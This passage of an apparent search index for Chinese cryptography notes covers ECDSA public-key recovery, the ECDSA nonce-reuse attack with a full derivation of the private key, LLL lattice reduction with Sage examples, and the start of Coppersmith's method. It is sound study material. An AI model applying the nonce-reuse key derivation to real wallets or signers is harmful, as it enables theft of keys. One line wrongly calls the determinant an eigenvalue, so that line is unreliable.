\u200b\u5750\u6807\u200b \\(x_1\\) \u200b\u6ee1\u8db3\u200b \\(r = x_1 \\bmod n\\)\uff0c\u200b\u56e0\u6b64\u200b\u6062\u590d\u200b\u8fc7\u7a0b\u200b\u5c31\u662f\u200b\uff1a</p> <ol> <li>\u200b\u5728\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u627e\u5230\u200b X \u200b\u5750\u6807\u200b\u6a21\u200b \\(n\\) \u200b\u7b49\u4e8e\u200b \\(r\\) \u200b\u7684\u200b\u70b9\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u70b9\u200b\u5c31\u662f\u200b \\(k \\times G\\)</li> <li>\u200b\u6309\u7167\u200b\u8ba1\u7b97\u200b\u54c8\u5e0c\u200b\u7684\u200b\u524d\u200b\u4e24\u6b65\u200b\uff0c\u200b\u4ece\u200b \\(m\\) \u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(z\\)</li> <li>\u200b\u6309\u7167\u200b\u4e0a\u8ff0\u200b\u516c\u5f0f\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(Q_A\\)</li> </ol> <p>\u200b\u4f46\u662f\u200b\u5b9e\u9645\u4e0a\u200b\u7b2c\u4e00\u6b65\u200b\u6ca1\u6709\u200b\u8fd9\u4e48\u200b\u7b80\u5355\u200b\uff1a\u200b\u9996\u5148\u200b\u540c\u4e00\u4e2a\u200b X \u200b\u5750\u6807\u200b\u5bf9\u5e94\u200b\u692d\u5706\u200b\u66f2\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u4e24\u4e2a\u200b\u70b9\u200b\uff0c\u200b\u5176\u6b21\u200b \\(r\\) \u200b\u548c\u200b \\(x_1\\) \u200b\u53ea\u662f\u200b\u540c\u4f59\u200b\u5173\u7cfb\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4e8c\u8005\u4e4b\u95f4\u200b\u5dee\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u500d\u6570\u200b\u3002\u200b\u56e0\u6b64\u200b\u5b9e\u9645\u200b\u5728\u200b BTC \u200b\u6216\u8005\u200b ETH \u200b\u91cc\u200b\u4f7f\u7528\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd8\u200b\u989d\u5916\u200b\u9644\u52a0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u53c2\u6570\u200b recid\uff0c\u200b\u8303\u56f4\u200b\u662f\u200b 0 \u200b\u5230\u200b 3\uff0c\u200b\u5bf9\u5e94\u200b Y \u200b\u5750\u6807\u200b\u662f\u200b\u6b63\u200b\u8fd8\u662f\u200b\u8d1f\u200b\uff0c\\(r\\) \u200b\u548c\u200b \\(x_1\\) \u200b\u4e4b\u95f4\u200b\u5dee\u200b 0 \u200b\u8fd8\u662f\u200b \\(n\\)\uff1a</p> <pre><code>// Source: https://github.com/ethereum/go-ethereum/blob/e1fe6bc8469c626afaa86b1dfb819737e980a574/crypto/secp256k1/libsecp256k1/src/modules/recovery/main_impl.h#L104-L112\nif (recid &amp; 2) {\n    if (secp256k1_fe_cmp_var(&amp;fx, &amp;secp256k1_ecdsa_const_p_minus_order) &gt;= 0) {\n        return 0;\n    }\n    secp256k1_fe_add(&amp;fx, &amp;secp256k1_ecdsa_const_order_as_fe);\n}\nif (!secp256k1_ge_set_xo_var(&amp;x, &amp;fx, recid &amp; 1)) {\n    return 0;\n}\n</code></pre> <p>\u200b\u53c2\u8003\u200b\uff1aCrypto Magic: Recovering Alice\u2019s Public Key From An ECDSA Signature \u200b\u548c\u200b Can We Recover The Public Key from an ECDSA Signature?</p>"},{"location":"cryptography/ecdsa.html#dsa","title":"DSA \u200b\u516c\u94a5\u200b\u6062\u590d","text":"<p>\u200b\u5982\u679c\u200b\u5728\u200b DSA \u200b\u7b97\u6cd5\u200b\u4e0a\u200b\u5c1d\u8bd5\u200b\u4e0a\u9762\u200b\u7684\u200b\u516c\u94a5\u200b\u6062\u590d\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u9047\u5230\u56f0\u96be\u200b\uff1a</p> \\[\\begin{align} g &amp;= h^{(p-1)/q} \\bmod p \\\\ y &amp;= g^x \\bmod p \\\\ r &amp;= (g ^ k \\bmod p) \\bmod q \\\\ s &amp;= (k^{-1}(H(m) + xr)) \\bmod q \\\\ sk &amp;\\equiv H(m) + xr \\bmod q \\\\ xr &amp;\\equiv sk - H(m) \\bmod q \\\\ x &amp;\\equiv r^{-1}(sk - H(m)) \\bmod q \\\\ y &amp;= g^x \\bmod p = g^{r^{-1}(sk - H(m))+nq} \\bmod p, n \\in Z \\\\ y &amp;= g^{r^{-1}sk}g^{-r^{-1}H(m)+nq} \\bmod p \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u65e0\u6cd5\u200b\u4ece\u200b \\(r\\) \u200b\u63a8\u65ad\u51fa\u200b \\(g^k \\bmod p\\) \u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4e2d\u95f4\u200b\u5dee\u200b\u4e86\u200b \\(q\\) \u200b\u7684\u200b\u6574\u6570\u500d\u200b\u3002\u200b\u540e\u9762\u200b\u7684\u200b \\(g^{nq} \\bmod p\\) \u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u8ba1\u7b97\u200b\u3002</p> <p>\u200b\u66f4\u52a0\u200b\u5b8c\u6574\u200b\u7684\u200b\u8ba8\u8bba\u200b\u53ef\u4ee5\u200b\u89c1\u200b Can we recover public key from DSA signatures as we can from ECDSA?\u3002</p>"},{"location":"cryptography/ecdsa.html#nonce-reuse-attack","title":"Nonce Reuse Attack","text":"<p>\u200b\u5728\u200b\u751f\u6210\u200b ECDSA \u200b\u7b7e\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6ce8\u610f\u200b\u4e0d\u80fd\u200b\u7528\u200b\u56fa\u5b9a\u200b\u7684\u200b nonce\uff08\\(k\\)\uff09\uff0c\u200b\u5426\u5219\u200b\u4f1a\u200b\u88ab\u200b\u653b\u51fb\u200b\u3002\u200b\u5047\u5982\u200b\u653b\u51fb\u8005\u200b\u7528\u200b\u4e00\u5bf9\u200b ECDSA key pair \u200b\u5bf9\u200b\u4e0d\u540c\u200b\u7684\u200b\u4e24\u4e2a\u200b\u6d88\u606f\u200b \\(m_1\\) \u200b\u548c\u200b \\(m_2\\) \u200b\u5206\u522b\u200b\u505a\u200b\u4e86\u200b\u4e00\u6b21\u200b\u7b7e\u540d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u91c7\u7528\u200b\u4e86\u200b\u76f8\u540c\u200b\u7684\u200b nonce\uff0c\u200b\u90a3\u4e48\u200b\uff1a</p> <p>\u200b\u4e24\u6b21\u200b\u7b7e\u540d\u200b\u7684\u200b nonce \\(k\\) \u200b\u76f8\u7b49\u200b\uff0c\u200b\u56e0\u6b64\u200b \\(x_1\\) \u200b\u76f8\u7b49\u200b\uff0c\\(r\\) \u200b\u4e5f\u200b\u76f8\u7b49\u200b\uff0c\u200b\u53ea\u6709\u200b \\(s\\) \u200b\u4e0d\u540c\u200b\uff1a</p> \\[\\begin{align} s_1 &amp;= k^{-1}(z_1 + rd_A) \\bmod n \\\\ s_2 &amp;= k^{-1}(z_2 + rd_A) \\bmod n \\end{align}\\] <p>\u200b\u7b7e\u540d\u200b\u662f\u200b\u516c\u5f00\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b \\(r\\)\u3001\\(s_1\\) \u200b\u548c\u200b \\(s_2\\) \u200b\u662f\u200b\u653b\u51fb\u8005\u200b\u5df2\u77e5\u200b\u7684\u200b\u3002\u200b\u6b64\u5916\u200b\u6d88\u606f\u200b \\(m_1\\) \u200b\u548c\u200b \\(m_2\\) \u200b\u4e5f\u200b\u662f\u200b\u5df2\u77e5\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u6c42\u200b\u51fa\u200b \\(z_1\\) \u200b\u548c\u200b \\(z_2\\)\u3002\u200b\u73b0\u5728\u200b\u5c1d\u8bd5\u200b\u6c42\u89e3\u200b \\(d_A\\)\uff1a</p> \\[\\begin{align} s_1 &amp;= k^{-1}(z_1 + rd_A) \\bmod n \\\\ s_2 &amp;= k^{-1}(z_2 + rd_A) \\bmod n \\\\ k &amp;= s_1^{-1}(z_1 + rd_A) \\bmod n \\\\ k &amp;= s_2^{-1}(z_2 + rd_A) \\bmod n \\\\ s_1^{-1}(z_1 + rd_A) &amp;= s_2^{-1}(z_2 + rd_A) \\bmod n \\\\ (s_1^{-1} - s_2^{-1})rd_A &amp;= s_2^{-1}z_2 - s_1^{-1}z_1 \\bmod n \\\\ d_A &amp;= r^{-1}(s_1^{-1} - s_2^{-1})^{-1}(s_2^{-1}z_2 - s_1^{-1}z_1) \\bmod n \\end{align}\\] <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u628a\u200b\u79c1\u94a5\u200b \\(d_A\\) \u200b\u6c42\u200b\u4e86\u200b\u51fa\u6765\u200b\u3002</p>"},{"location":"cryptography/lll.html","title":"LLL \u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5","text":"<p>LLL\uff08Lenstra\u2013Lenstra\u2013Lov\u00e1sz\uff09\u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u683c\u200b\uff08lattice\uff09\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff08basis\uff09\u200b\u7684\u200b\u89c4\u7ea6\u200b\uff0c\u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u4e86\u200b\u65b0\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e9b\u200b\u57fa\u200b\u5411\u91cf\u200b\u7684\u200b\u5927\u5c0f\u200b\u6ee1\u8db3\u200b\u4e0d\u7b49\u5f0f\u200b\u3002</p>"},{"location":"cryptography/lll.html#_1","title":"\u683c","text":"<p>\u200b\u9996\u5148\u200b\u5b9a\u4e49\u200b\u4ec0\u4e48\u200b\u662f\u200b\u683c\u200b\uff08lattice\uff09\uff1a</p> <p>\u200b\u7ed9\u5b9a\u200b \\(\\mathbb{R}^n\\) \u200b\u4e0a\u200b\u7684\u200b \\(n\\) \u200b\u4e2a\u200b\u5411\u91cf\u200b \\(\\{b_1, b_2, \\cdots b_n\\}\\)\uff1a</p> \\[\\begin{align} b_1 &amp;= (a_{11}, a_{12}, \\cdots, a_{1n}) \\\\ b_2 &amp;= (a_{21}, a_{22}, \\cdots, a_{2n}) \\\\ &amp;\\vdots \\\\ b_n &amp;= (a_{n1}, a_{n2}, \\cdots, a_{nn}) \\\\ \\end{align}\\] <p>\u200b\u5c06\u200b\u8fd9\u4e9b\u200b\u57fa\u200b\u5411\u91cf\u200b\u4ee5\u6574\u200b\u7cfb\u6570\u200b\u7ebf\u6027\u7ec4\u5408\u200b\u5f97\u5230\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5c31\u662f\u200b\u683c\u200b\uff1a</p> \\[ L = \\{\\sum_i^d r_ib_i \\vert r_i \\in \\mathbb{Z}\\} \\] <p>\u200b\u4f8b\u5982\u200b \\(\\mathbb{Z}^2\\) \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u4ee5\u200b \\((1, 0), (0, 1)\\) \u200b\u4e3a\u57fa\u200b\u6784\u6210\u200b\u7684\u200b\u683c\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u4ee5\u200b \\((1, 0), (1, 1)\\) \u200b\u4e3a\u57fa\u200b\u6784\u6210\u200b\u7684\u200b\u683c\u200b\u3002</p>"},{"location":"cryptography/lll.html#_2","title":"\u683c\u57fa\u200b\u89c4\u7ea6","text":"<p>\u200b\u683c\u200b\u89c4\u7ea6\u200b\u8981\u200b\u5b9e\u73b0\u200b\u7684\u200b\u4e8b\u60c5\u200b\u662f\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u7ed9\u5b9a\u200b\u7684\u200b\u683c\u200b L\uff0c\u200b\u5373\u200b\u5df2\u77e5\u200b\uff1a</p> \\[ L = \\{\\sum_i^d r_ib_i \\vert r_i \\in \\mathbb{Z}\\} \\] <p>\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4e00\u7ec4\u200b\u65b0\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b \\(\\{b_1', b_2', \\cdots, b_n'\\}\\)\uff0c\u200b\u6ee1\u8db3\u200b\uff1a</p> \\[ L = \\{\\sum_i^d r_ib_i' \\vert r_i \\in \\mathbb{Z}\\} \\] <p>\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e24\u7ec4\u200b\u57fa\u5728\u200b\u6784\u6210\u200b\u683c\u200b L \u200b\u4e0a\u200b\u662f\u200b\u7b49\u4ef7\u200b\u7684\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u89c4\u7ea6\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u4f1a\u200b\u7ed9\u200b\u65b0\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\u6dfb\u52a0\u200b\u7ea6\u675f\u200b\uff0c\u200b\u4ece\u800c\u200b\u5f97\u5230\u200b\u201c\u200b\u66f4\u597d\u200b\u201d\u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\u3002</p>"},{"location":"cryptography/lll.html#lll_1","title":"LLL \u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5","text":"<p>LLL \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5bf9\u4e8e\u200b \\(L \\subset \\mathbb{Z}^n\\) \u200b\u7684\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff0c\u200b\u8fdb\u884c\u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u7684\u200b\u57fa\u200b \\(\\{b_1, b_2, \\cdots b_n\\}\\) \u200b\u6ee1\u8db3\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u6027\u8d28\u200b\uff1a</p> \\[ |b_1| \\le 2^{(n-1)/4} |\\mathrm{det}(L)|^{1/n} \\] <p>\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u57fa\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b\u6709\u754c\u200b\u7684\u200b\uff0c\u200b\u516c\u5f0f\u200b\u4e2d\u200b \\(\\mathrm{det}(L)\\) \u200b\u6307\u200b\u7684\u200b\u662f\u200b\u628a\u200b\u57fa\u200b\u5411\u91cf\u200b\u62fc\u63a5\u200b\u6210\u200b\u7684\u200b\u77e9\u5f62\u200b\u7684\u200b\u7279\u5f81\u503c\u200b\u3002</p> <p>LLL \u200b\u7b97\u6cd5\u200b\u8fd8\u4f1a\u200b\u5f97\u5230\u200b\u5176\u4ed6\u200b\u7684\u200b\u6027\u8d28\u200b\uff0c\u200b\u8be6\u89c1\u200b Wikipedia\u3002</p>"},{"location":"cryptography/lll.html#_3","title":"\u5e94\u7528","text":""},{"location":"cryptography/lll.html#_4","title":"\u5df2\u77e5\u200b\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6839\u200b\uff0c\u200b\u6c42\u200b\u591a\u9879\u5f0f","text":"<p>\u200b\u5e94\u7528\u200b LLL \u200b\u53ef\u4ee5\u200b\u6c42\u89e3\u200b\u8fd9\u6837\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u5df2\u77e5\u200b\u6709\u200b\u4e00\u4e2a\u200b \\(n\\) \u200b\u6b21\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b\u4ee5\u53ca\u200b\u5b83\u200b\u7684\u200b\u96f6\u70b9\u200b \\(r\\)\uff0c\u200b\u73b0\u5728\u200b\u8981\u6c42\u200b\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u5404\u9879\u200b\u7cfb\u6570\u200b\u7684\u200b\u591a\u5c11\u200b\u3002</p> <p>\u200b\u4f8b\u5b50\u200b\uff1a\u200b\u5df2\u77e5\u200b \\(r=1.6180339\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b 2 \u200b\u6b21\u200b\u6574\u6570\u200b\u591a\u9879\u5f0f\u200b \\(ax^2 + bx + c\\) \u200b\u7684\u200b\u96f6\u70b9\u200b\uff0c\u200b\u5373\u200b \\(ar^2 + br + c=0\\)\uff0c\u200b\u6c42\u200b \\(a\\) \\(b\\) \\(c\\)\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u5229\u7528\u200b LLL \u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u9700\u8981\u200b\u6839\u636e\u200b\u9898\u76ee\u200b\u6761\u4ef6\u200b\u6784\u9020\u200b\u51fa\u200b\u4e00\u7ec4\u200b\u57fa\u200b \\(\\{b_1, b_2, b_3\\}\\)\uff1a</p> \\[\\begin{align} b_1 &amp;= (1, 0, Xr^2) \\\\ b_2 &amp;= (0, 1, Xr) \\\\ b_3 &amp;= (0, 0, X) \\\\ \\end{align}\\] <p>\u200b\u5176\u4e2d\u200b \\(X\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u6574\u6570\u200b\uff0c\u200b\u56e0\u4e3a\u200b LLL \u200b\u7b97\u6cd5\u200b\u8981\u6c42\u200b \\(L \\subset \\mathbb{Z}^n\\)\uff0c\u200b\u6240\u4ee5\u200b\u4e0a\u5f0f\u200b\u4e2d\u200b\u7684\u200b \\(Xr^2\\) \u200b\u548c\u200b \\(Xr\\) \u200b\u4e24\u9879\u200b\u90fd\u200b\u9700\u8981\u200b\u53d6\u6574\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4e3a\u4e86\u200b\u4e0b\u9762\u200b\u516c\u5f0f\u200b\u63a8\u5bfc\u200b\u7684\u200b\u65b9\u4fbf\u200b\uff0c\u200b\u6682\u65f6\u200b\u7701\u7565\u200b\u4e86\u200b\u3002</p> <p>\u200b\u5047\u5982\u200b\u5bf9\u200b\u4e0a\u9762\u200b\u7684\u200b\u57fa\u200b\u8fdb\u884c\u200b LLL \u200b\u683c\u57fa\u200b\u89c4\u7ea6\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5e94\u8be5\u200b\u4f1a\u200b\u5f97\u5230\u200b\u4e00\u7ec4\u200b\u65b0\u200b\u7684\u200b\u57fa\u200b \\(\\{b_1', b_2', b_3'\\}\\)\uff0c\u200b\u6ee1\u8db3\u200b\uff1a</p> \\[ |b_1'| \\le 2^{(n-1)/4} |\\mathrm{det}(L)|^{1/n} \\] <p>\u200b\u5176\u4e2d\u200b\uff1a</p> \\[ L = (b_1^T b_2^T b_3^T) = \\begin{pmatrix} 1 &amp; 0 &amp; 0 \\\\ 0 &amp; 1 &amp; 0 \\\\ Xr^2 &amp; Xr &amp; X \\end{pmatrix} \\] <p>\u200b\u8ba1\u7b97\u200b\u884c\u5217\u5f0f\u200b\u53ef\u200b\u5f97\u200b \\(\\mathrm{det}(L)=X\\)\uff0c\u200b\u4ee3\u5165\u200b \\(n=3\\) \u200b\u5230\u200b\u4e0a\u5f0f\u200b\uff0c\u200b\u53ef\u200b\u5f97\u200b \\(|b_1'| \\le 2^{1/2} |X|^{1/3}\\)\u3002</p> <p>\u200b\u53c8\u200b\u56e0\u4e3a\u200b\u4e24\u7ec4\u200b\u57fa\u662f\u200b\u7b49\u4ef7\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b \\(b_1'\\) \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u200b \\(\\{b_1, b_2, b_3\\}\\) \u200b\u7ebf\u6027\u7ec4\u5408\u200b\u5f97\u5230\u200b\uff0c\u200b\u4e14\u200b\u7cfb\u6570\u200b \\(A\\) \\(B\\) \\(C\\) \u200b\u662f\u200b\u6574\u6570\u200b\uff1a</p> \\[\\begin{align} b_1' &amp;= Ab_1 + Bb_2 + Cb_3 \\\\ &amp;= (A, 0, AXr^2) + (0, B, BXr) + (0, 0, CX) \\\\ &amp;= (A, 0, XAr^2) + (0, B, XBr) + (0, 0, XC) \\\\ &amp;= (A, B, X(Ar^2 + Br + C)) \\end{align}\\] <p>\u200b\u56e0\u6b64\u200b \\(|b_1'| = \\sqrt{A^2+B^2+(X(Ar^2+Br+C))^2} \\le 2^{1/2} X^{1/3}\\)\uff0c\u200b\u7531\u4e8e\u200b \\(X\\) \u200b\u662f\u200b\u81ea\u5df1\u200b\u9009\u5b9a\u200b\u7684\u200b\u4efb\u610f\u200b\u6574\u6570\u200b\uff0c\u200b\u5f53\u200b X \u200b\u53d6\u200b\u8db3\u591f\u200b\u5927\u65f6\u200b\uff0c\u200b\u53ea\u6709\u200b\u5f53\u200b \\(Ar^2+Br+C \\approx 0\\) \u200b\u65f6\u200b\uff0c\u200b\u4e0a\u200b\u5f0f\u200b\u624d\u80fd\u200b\u6ee1\u8db3\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u627e\u5230\u200b\u4e86\u200b\u4ee5\u200b \\(r\\) \u200b\u4e3a\u200b\u96f6\u70b9\u200b\u7684\u200b\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b\u3002</p> <p>\u200b\u6b64\u65f6\u200b \\(A\\) \u200b\u548c\u200b \\(B\\) \u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4ece\u200b\u5f97\u5230\u200b\u7684\u200b \\(b_1'\\) \u200b\u57fa\u200b\u5411\u91cf\u200b\u4e2d\u200b\u53d6\u51fa\u200b\uff0c\\(C\\) \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b \\(C=-Ar^2-Br\\) \u200b\u8ba1\u7b97\u200b\u5f97\u51fa\u200b\u3002</p> <p>\u200b\u5b9e\u9645\u4e0a\u200b\u4f7f\u7528\u200b LLL \u200b\u7b97\u6cd5\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u57fa\u7684\u200b\u4e2a\u6570\u200b\u53ef\u4ee5\u200b\u5c11\u4e8e\u200b\u7ef4\u6570\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5bf9\u4e8e\u200b\u4e0a\u9762\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u51fa\u200b\u5982\u4e0b\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff1a</p> \\[\\begin{align} b_1 &amp;= (1, 0, 0, Xr^2) \\\\ b_2 &amp;= (0, 1, 0, Xr) \\\\ b_3 &amp;= (0, 0, 1, X) \\\\ \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u7ecf\u8fc7\u200b LLL \u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b\u7684\u200b \\(b_1'=(A, B, C, *)\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u76f4\u63a5\u200b\u5f97\u5230\u200b\u4e86\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6240\u6709\u200b\u7cfb\u6570\u200b\u3002</p> <p>\u200b\u7528\u200b sage \u200b\u5b9e\u73b0\u200b\u4e0a\u9762\u200b\u7684\u200b\u7b97\u6cd5\u200b\uff1a</p> <pre><code># parameters\nr = 1.618\ndegree = 2\nX = 10000\n\n# build lattice matrix\nmatrix = []\n\nfor i in range(degree + 1):\n    matrix.append(\n        [int(i == j) for j in range(degree + 1)] + [round(X * (r ** (degree - i)))]\n    )\n\n# compute first basis vector after LLL reduction\nm = Matrix(ZZ, matrix)\nans = m.LLL()[0]\n\n# recover polynomial\nexpr = 0\nx = var(\"x\")\nfor i in range(degree + 1):\n    expr = expr + ans[i] * (x ** (degree - i))\n\n# prints \"-x^2 + x + 1\"\nprint(expr)\n</code></pre>"},{"location":"cryptography/lll.html#_5","title":"\u627e\u5230\u200b\u8fd1\u4f3c\u200b\u7ed9\u5b9a\u200b\u5b9e\u6570\u200b\u7684\u200b\u6709\u7406\u6570","text":"<p>\u200b\u4f7f\u7528\u200b LLL \u200b\u53ef\u4ee5\u200b\u9488\u5bf9\u200b\u7ed9\u5b9a\u200b\u5b9e\u6570\u200b \\(a\\)\uff0c\u200b\u627e\u5230\u200b\u6574\u6570\u200b \\(x\\) \u200b\u548c\u200b \\(y\\)\uff0c\u200b\u4f7f\u5f97\u200b \\(x/y \\approx a\\)\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4f7f\u7528\u200b LLL \u200b\u7b97\u6cd5\u200b\u89e3\u51b3\u200b\uff0c\u200b\u9700\u8981\u200b\u628a\u200b\u7b49\u5f0f\u200b\u7684\u200b\u5404\u9879\u200b\u53d8\u6210\u200b\u6574\u6570\u200b\uff1a</p> \\[\\begin{align} \\frac{x}{y} &amp;= a \\\\ x - ay &amp;= 0 \\\\ 10^px - \\mathrm{round}(10^pa)y &amp;= 0 \\\\ \\end{align}\\] <p>\u200b\u4e58\u4ee5\u200b \\(10^p\\) \u200b\u540e\u53d6\u200b\u6574\u662f\u200b\u4e3a\u4e86\u200b\u5728\u200b\u53d6\u6574\u200b\u4e4b\u524d\u200b\u80fd\u591f\u200b\u4fdd\u7559\u200b \\(a\\) \u200b\u7684\u200b \\(p\\) \u200b\u4f4d\u200b\u5c0f\u6570\u200b\u90e8\u5206\u200b\uff0c\u200b\u4e5f\u200b\u65b9\u4fbf\u200b\u540e\u7eed\u200b LLL \u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u5c3d\u91cf\u200b\u8ba9\u200b\u7b49\u5f0f\u200b\u53f3\u8fb9\u200b\u7b49\u4e8e\u200b 0\u3002\u200b\u5728\u200b\u6b64\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u6784\u9020\u200b\u51fa\u200b\u4e00\u7ec4\u200b\u57fa\u200b\uff1a</p> \\[\\begin{align} b_1 &amp;= (1, 0, 10^p) \\\\ b_2 &amp;= (0, 1, -\\mathrm{round}(10^pa)) \\end{align}\\] <p>LLL \u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b \\(b_1'=(x, y, 10^px -\\mathrm{round}(10^pa)y)\\)\u3002</p> <p>\u200b\u7528\u200b Sage \u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code># parameters\na = 3.1415926535\np = 10\n\n# construct matrix\nm = 10**p\nmatrix = Matrix(\n    ZZ,\n    [[1, 0, m], [0, 1, round(-a * m)]],\n)\n\n# extract answer after LLL\nans = matrix.LLL()\nnumerator = ans[0][0]\ndenominator = ans[0][1]\n\n# print \"-104348 / -33215 = 3.141592653921421\"\nprint(f\"{numerator} / {denominator} = {float(numerator) / denominator}\")\n</code></pre> <p>\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u516c\u5f0f\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5728\u200b\u903c\u8fd1\u200b \\(x/y \\approx a\\) \u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u8fd8\u8981\u200b\u8ba9\u200b \\(y\\) \u200b\u7684\u200b\u7edd\u5bf9\u503c\u200b\u5c3d\u91cf\u200b\u5c0f\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u8fd9\u6837\u200b\u8bbe\u8ba1\u200b\uff1a</p> \\[\\begin{align} b_1 &amp;= (1, 0, 10^p, 10^q, 0) \\\\ b_2 &amp;= (0, 1, -\\mathrm{round}(10^pa), 0, 10^q) \\end{align}\\] <p>LLL \u200b\u89c4\u7ea6\u200b\u540e\u200b\u5f97\u5230\u200b \\(b_1'=(x, y, 10^px -\\mathrm{round}(10^pa)y, 10^qx, 10^qy)\\)\u3002\u200b\u5f53\u200b \\(p=10, q=5\\) \u200b\u65f6\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b \\(355 / 113 = 3.1415929203539825\\)\u3002</p>"},{"location":"cryptography/lll.html#coppersmith","title":"Coppersmith \u200b\u7b97\u6cd5\u200b\u6c42\u89e3\u200b\u540c\u4f59\u200b\u591a\u9879\u5f0f\u200b\u65b9\u7a0b","text":"<p>Coppersmith \u200b\u7b97\u6cd5\u200b\u5229\u7528\u200b LLL \u200b\u7b97\u6cd5\u200b\u6765\u6c42\u200b\u7279\u5b9a\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5728\u200b\u540c\u4f59\u200b\u610f\u4e49\u200b\u4e0b\u200b\u7684\u200b\u6574\u6570\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6839\u200b\uff1a</p> \\[ f(x) = 0 \\quad \\pmod n \\] <p>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u540c\u4f59\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8981\u89e3\u200b \\(f(x) = 